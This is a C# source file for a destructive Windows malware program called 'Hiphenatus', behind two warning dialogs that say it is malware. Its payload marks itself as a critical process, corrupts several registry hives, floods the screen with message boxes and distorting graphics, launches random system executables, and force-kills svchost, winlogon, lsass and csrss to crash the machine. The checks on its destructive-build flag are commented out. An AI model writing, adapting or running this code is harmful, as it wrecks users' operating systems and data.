using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Hiphenatus.Bytebeats;
using static Hiphenatus.Virus;
using static Hiphenatus.WinApi.APIs;

namespace Hiphenatus
{
    public partial class Form1 : Form
    {
        public string IS_THIS_BUILD_DESTRUCTIVE = "YES";

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

        [DllImport("gdi32.dll")]
        private static extern int SelectClipRgn(IntPtr hdc, IntPtr hrgn);


        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {
            // Corrected MessageBox usage to use System.Windows.Forms.MessageBox  
            System.Windows.Forms.MessageBox.Show("yeah that true");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (trackBar1.Value == 7)
            {
                // Corrected MessageBox usage to use System.Windows.Forms.MessageBox  
                // First  
                if (System.Windows.Forms.MessageBox.Show("Hi! This is MALWARE. " + Environment.NewLine + "Are you sure you want to continue?", "_-Hiphenatus-_ - Last Chance: DESTRUCTIVE? " + IS_THIS_BUILD_DESTRUCTIVE, MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
                {
                    // Second  
                    if (System.Windows.Forms.MessageBox.Show("Last chance, click OK to cancel the malware and save your computer. This is not a joke, click fucking [[CANCEL]] to save yo shit ass pc.", "_-Hiphenatus-_ - Last Chance: DESTRUCTIVE? " + IS_THIS_BUILD_DESTRUCTIVE, MessageBoxButtons.OKCancel, MessageBoxIcon.Error) == DialogResult.OK)
                    {
                        execPayload();
                    }
                    else
                    {
                        Environment.Exit(0); // QUIT  
                    }
                }
                else
                {
                    Environment.Exit(0); // QUIT  
                }
            }
        }

        public static string randomUni(int length)
        {
            Random random = new Random();
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                builder.Append((char)random.Next(0x0000, 0x10FFFF));
            }
            return builder.ToString();
        }

        public static void MSGLOL()
        {
            while (true)
            {
                System.Windows.Forms.MessageBox.Show(randomUni(20));
            }
        }

        public static void Shader1()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset = i * 3;
                        rgbArray[offset + 2] = (byte)(rgbArray[offset + 2] - 1);
                        rgbArray[offset + 1] = (byte)(rgbArray[offset + 1] - 1);
                        rgbArray[offset + 0] = (byte)(rgbArray[offset + 0] - 1);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, random.Next(-5, 5), random.Next(-5, 5), x, y, mdc, 0, 0, SRCPAINT);

                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
            
        }
        public static void Shader2()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset = i * 3;
                        // ⚡ Bolt: Removed redundant self-assignment to G channel and
                        // simplified R/B channel assignment to eliminate redundant memory write per pixel
                        rgbArray[offset + 2] = (byte)(rgbArray[offset + 0]);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

                    Thread.Sleep(1);
                }
            }

            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
        }
        public static void Shader3()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset3 = i * 3;
                        int offset2 = i * 2;
                        rgbArray[offset3 + 2] = (byte)(rgbArray[offset2 + 2]);
                        rgbArray[offset3 + 1] = (byte)(rgbArray[offset2 + 1]);
                        rgbArray[offset3 + 0] = (byte)(rgbArray[offset2 + 2]);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
        }
        public static void Shader4()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset = i * 3;
                        rgbArray[offset + 2] = (byte)(rgbArray[offset + 2] * rgbArray[offset + 1]);
                        rgbArray[offset + 1] = (byte)(rgbArray[offset + 1] * rgbArray[offset + 0]);
                        rgbArray[offset + 0] = (byte)(rgbArray[offset + 0] * rgbArray[offset + 2]);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
            ;
        }
        public static void Shader5()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            // ⚡ Bolt: Precompute trigonometric functions to avoid calculating them inside the parallel render loop
            double[] sinCache = new double[size];
            double[] cosCache = new double[size];
            Parallel.For(8, size, i =>
            {
                sinCache[i] = Math.Sin(i);
                cosCache[i] = Math.Cos(i);
            });

            double ok = 0;
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    double sinOk = Math.Sin(ok);
                    double invSinOk = 1.0 / sinOk;
                    Parallel.For(8, size, i =>
                    {
                        // Cache loop-invariant math calculations for performance
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset = i * 3;
                        // ⚡ Bolt: Strength reduction: replace division by multiplying with pre-calculated inverse.
                        double tanVal = Math.Tan(i * invSinOk);
                        double sinI = sinCache[i];
                        // ⚡ Bolt: Eliminate common sub-expression since R and B compute the exact same value.
                        byte rAndB = (byte)(sinI * tanVal);
                        rgbArray[offset + 2] = rAndB;
                        rgbArray[offset + 1] = (byte)(cosCache[i] * tanVal);
                        rgbArray[offset + 0] = rAndB;

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
                    ok += 0.000000001;
                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
            ;
        }
        public static void Shader6()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            // Precompute Sqrt for bytes (0-255) to avoid redundant math per-pixel
            double[] sqrtCache = new double[256];
            for (int i = 0; i < 256; i++) {
                sqrtCache[i] = Math.Sqrt(i);
            }

            int sigma = 1;
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    double factor = Math.Tan(sigma) * sigma;
                    // ⚡ Bolt: Strength reduction: replace division by multiplying with pre-calculated inverse.
                    double invFactor = 1.0 / factor;
                    Parallel.For(8, size, i =>
                    {
                        // Cache loop-invariant math calculations for performance
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset = i * 3;
                        double term = i * invFactor;
                        rgbArray[offset + 2] = (byte)(sqrtCache[rgbArray[offset + 2]] * term);
                        rgbArray[offset + 1] = (byte)(sqrtCache[rgbArray[offset + 1]] * term);
                        rgbArray[offset + 0] = (byte)(sqrtCache[rgbArray[offset + 0]] * term);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCERASE);
                    //ci(sigma, sigma, sigma*2, sigma*2);
                    sigma++;
                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
        }
        public static void Shader7()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);
            int sigma = 1;
            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices and math operations to significantly reduce overhead.
                        int offset = i * 3;
                        // ⚡ Bolt: Bypass expensive division instruction for pixels where i > sigma (99.9% of loop iterations).
                        int shift = i > sigma ? 0 : sigma / i;
                        byte add = (byte)Math.Sqrt(sigma * i >> shift);
                        rgbArray[offset + 2] = (byte)(rgbArray[offset + 2] + add);
                        rgbArray[offset + 1] = (byte)(rgbArray[offset + 1] + add);
                        rgbArray[offset + 0] = (byte)(rgbArray[offset + 0] + add);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 10, 0, x, y, mdc, 0, 0, SRCCOPY);
                    //ci(sigma, sigma, sigma*2, sigma*2);
                    sigma++;
                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
        }
        public static void Shader8()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);
            int sigma = 1;
            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
            try
            {
                while (true)
                {
                    BitBlt(mdc, 1, 1, x, y, hdc, 0, 0, SRCAND);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices and math operations to significantly reduce overhead.
                        int offset = i * 3;
                        int sigI = sigma * i;
                        // ⚡ Bolt: Because C# applies % 32 on 32-bit shift sizes, 1010 >> 32 = 18 and 101010 >> 32 = 18.
                        // Compute Math.Sqrt for this shift once and reuse it for both R and G channels.
                        double sqrtCommon = Math.Sqrt(sigI >> 1010);
                        rgbArray[offset + 2] = (byte)(rgbArray[offset + 2] + Math.Sqrt(sigI >> 10));
                        rgbArray[offset + 1] = (byte)(rgbArray[offset + 1] + sqrtCommon);
                        rgbArray[offset + 0] = (byte)(rgbArray[offset + 0] + sqrtCommon);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
                    //ci(sigma, sigma, sigma*2, sigma*2);
                    sigma++;
                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
        }
        public static void Shader9()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);
            Random skibidi = new Random();
            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
            try
            {
                while (true)
                {
                    BitBlt(mdc, 0 + skibidi.Next(-5, 5), 0 + skibidi.Next(-5, 5), x + skibidi.Next(-5, 5), y + skibidi.Next(-5, 5), hdc, 0 + skibidi.Next(-5, 5), 0 + skibidi.Next(-5, 5), SRCPAINT);
                    Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                    Parallel.For(8, size, i =>
                    {
                        // ⚡ Bolt: Cache repetitive array indices to significantly reduce overhead.
                        int offset = i * 3;
                        rgbArray[offset + 2] = (byte)(((rgbArray[offset + 2])) + 1);
                        rgbArray[offset + 1] = (byte)(((rgbArray[offset + 1])) + 2);
                        rgbArray[offset + 0] = (byte)(((rgbArray[offset + 0])) + 3);

                    });
                    Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                    BitBlt(hdc, 0 + skibidi.Next(-5, 5), 0 + skibidi.Next(-5, 5), x + skibidi.Next(-5, 5), y + skibidi.Next(-5, 5), mdc, 0 + skibidi.Next(-5, 5), 0 + skibidi.Next(-5, 5), SRCERASE);
                    //ci(sigma, sigma, sigma*2, sigma*2);
                    Thread.Sleep(1);
                }
            }
            catch (ThreadAbortException)
            {
                SelectObject(mdc, oldObject);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bitmap);
                DeleteDC(hdc);
                DeleteDC(mdc);
            }
        }
        public void ci(int x, int y, int w, int h)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hrgn = CreateEllipticRgn(x, y, x + w, y + h);
            SelectClipRgn(hdc, hrgn);
            BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
            DeleteObject(hrgn);
            ReleaseDC(IntPtr.Zero, hdc);
        }

        public void MoveCircle()
        {
            int x = 100, y = 100; // Initial position
            int dx = 15, dy = 15;  // Velocity (change in position)
            int width = 50, height = 50; // Circle dimensions
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            while (true)
            {
                // Update position
                x += dx;
                y += dy;

                // Check for collisions with screen boundaries
                if (x <= 0 || x + width >= screenWidth)
                    dx = -dx; // Reverse horizontal direction
                if (y <= 0 || y + height >= screenHeight)
                    dy = -dy; // Reverse vertical direction

                // Draw the circle at the new position
                ci(x, y, width, height);
                Thread.Sleep(1);
            }
        }
        public void Sines()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            IntPtr hcdc = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(hcdc, hBitmap);
            BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            // ⚡ Bolt: Precompute Math.Tan(y) to avoid calculating it inside the render loop
            float[] tanY = new float[h + 1];
            for (int y = 0; y <= h; y++)
            {
                tanY[y] = (float)Math.Tan(y);
            }

            for (int t = 0; ; t += 20)
            {
                hdc = GetDC(IntPtr.Zero);

                // ⚡ Bolt: Cache Math.Tan(t) as it is loop-invariant for the inner y-loop
                float tanT = (float)Math.Tan(t);

                for (int y = 0; y <= h; y++)
                {
                    float x = tanY[y] + tanT;
                    BitBlt(hcdc, (int)x, y, w, 1, hcdc, 0, (int)(y + x), SRCCOPY);
                }

                BLENDFUNCTION blend = new BLENDFUNCTION
                {
                    BlendOp = AC_SRC_OVER,
                    BlendFlags = 0,
                    SourceConstantAlpha = 111,
                    AlphaFormat = 0
                };

                AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
                ReleaseDC(IntPtr.Zero, hdc);
            }

            ReleaseDC(IntPtr.Zero, hcdc);
            DeleteObject(hcdc);
            DeleteObject(hBitmap);
        }
        public static void DefineAsCritical()
        {
            int isCritical = 1;
            Process.EnterDebugMode();
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, 0x1D, ref isCritical, sizeof(int));
        }
        public static void randEXE()
        {
            // Open a random exe file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    Process.Start(files[random.Next(files.Length)]);
                }
                catch (Exception) { }
            }
        }
        public static void randEXELOOP(int ms)
        {
            while (true)
            {
                randEXE();
                Thread.Sleep(ms);
            }
        }
        public void execPayload()
        {
            DefineAsCritical();
            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
            //{
                Thread hd = new Thread(HardDisable); hd.Start();
                Thread corr1 = new Thread(() => Corrupt(Registry.CurrentUser));
                corr1.Start();
            //}

            Process.Start("https://www.youtube.com/@sudoUltimateQuack");

            Thread XDD = new Thread(MSGLOL); XDD.Start();
            Thread shader1Thread = new Thread(Shader1); shader1Thread.Start();
            Thread shader2Thread = new Thread(Shader2); shader2Thread.Start();
            Thread circle = new Thread(MoveCircle); circle.Start();
            Thread bytebeat1 = new Thread(Beat5); bytebeat1.Start();

#if DEBUG
            Console.WriteLine("Phase 1 - Start");
#endif

            Thread.Sleep(8000);

            ClearScreen();

            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
            //{
                Thread corr2 = new Thread(() => Corrupt(Registry.LocalMachine));
                corr2.Start();
            //}

            XDD.Abort();
            shader1Thread.Abort();
            shader2Thread.Abort();
            circle.Abort();
            bytebeat1.Abort();

            Thread shader3Thread = new Thread(Shader3); shader3Thread.Start();
            Thread bytebeat2 = new Thread(Beat9); bytebeat2.Start();
            Thread exexe = new Thread(() => randEXELOOP(2000));
#if DEBUG
            Console.WriteLine("Phase 2 - Start");
#endif

            Thread.Sleep(8000);

            ClearScreen();

            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
            //{
                Thread corr3 = new Thread(() => Corrupt(Registry.ClassesRoot));
                corr3.Start();
            //}

            shader3Thread.Abort();
            bytebeat2.Abort();

            Thread shader4Thread = new Thread(Shader4); shader4Thread.Start();
            Thread shader5Thread = new Thread(Sines); shader5Thread.Start();
            Thread bytebeat3 = new Thread(Beat8); bytebeat3.Start();

#if DEBUG
            Console.WriteLine("Phase 3 - Start");
#endif

            Thread.Sleep(8000);

            ClearScreen();

            //if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
            //{
                Thread corr4 = new Thread(() => Corrupt(Registry.Users));
                corr4.Start();
            ///}

            shader4Thread.Abort();
            bytebeat3.Abort();
            
            shader5Thread.Abort();

            Thread shader6Thread = new Thread(Shader5); shader6Thread.Start();
            Thread bytebeat4 = new Thread(Beat10); bytebeat4.Start();

#if DEBUG
            Console.WriteLine("Phase 4 - Start");
#endif

            Thread.Sleep(8000);

            shader6Thread.Abort();
            bytebeat4.Abort();

            Thread shader7Thread = new Thread(Shader6); shader7Thread.Start();
            Thread bytebeat5 = new Thread(Beat11); bytebeat5.Start();

#if DEBUG
            Console.WriteLine("Phase 5 - Start");
#endif

            Thread.Sleep(8000);

#if DEBUG
            Console.WriteLine("FINAL DEATH - Start");
#endif

            shader7Thread.Abort();
            bytebeat5.Abort();
            exexe.Abort();

            /*corr1.Abort();
            corr2.Abort();
            corr3.Abort();
            corr4.Abort();*/

            Thread bytebeat6 = new Thread(Beat11andhalf); bytebeat6.Start();

            if (DateTime.Now.Day == 31) { Environment.Exit(0); bytebeat6.Abort(); } // death WITHOUT BSOD  

            Thread.Sleep(10);
            Process.Start("taskkill", "/f /t /im svchost.exe");  //  B
            Thread.Sleep(10);
            Process.Start("taskkill", "/f /t /im winlogon.exe"); //    FUCKING
            Thread.Sleep(10);
            Process.Start("taskkill", "/f /t /im lsass.exe");    //      SOD
            Thread.Sleep(10);
            Process.Start("taskkill", "/f /t /im csrss.exe");   //        (again)
            Thread.Sleep(1000);
            Console.WriteLine("ayo wtf");
        }
        private void Form1_Load(object sender, EventArgs e)
        {
#if DEBUG
            Console.WriteLine("Form1 loaded!");
#endif
        }

        private void button2_Click(object sender, EventArgs e)
        {
            SFXLMAO();
            Environment.Exit(0);
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
#if DEBUG
            Console.WriteLine("DEATHtrackBar: " + trackBar1.Value.ToString());
#endif
        }

        public void SFXLMAO()
        {
            // Convert the byte array to a temporary file path
            string tempFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic), "sigma.mp3");
            File.WriteAllBytes(tempFilePath, Properties.Resources.sigma_boy);

            Process.Start("wmplayer.exe", $"\"{tempFilePath}\"");

            /*Task.Run(() =>
            {*/
                Thread.Sleep(5000);
                File.Delete(tempFilePath);
                Process.Start("taskkill wmplayer.exe /f /im");
            //});
        }
    }
}
